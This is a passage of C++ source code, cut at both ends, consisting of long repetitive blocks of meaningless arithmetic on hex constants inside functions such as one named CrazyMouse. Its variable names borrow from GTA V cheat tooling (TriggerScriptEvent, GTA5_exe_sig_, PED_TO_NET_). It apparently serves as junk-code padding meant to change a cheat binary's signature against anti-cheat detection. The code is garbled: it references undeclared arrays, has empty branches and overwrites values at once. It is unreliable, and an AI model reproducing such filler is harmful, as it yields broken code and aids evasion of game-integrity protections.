			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			return GetSystemMetrics(SM_CYSCREEN);
		}
		void CrazyMouse()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
